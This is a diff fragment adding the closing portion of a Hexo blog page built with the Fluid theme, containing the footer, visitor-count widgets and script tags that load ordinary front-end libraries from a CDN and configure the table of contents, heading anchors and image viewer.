+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
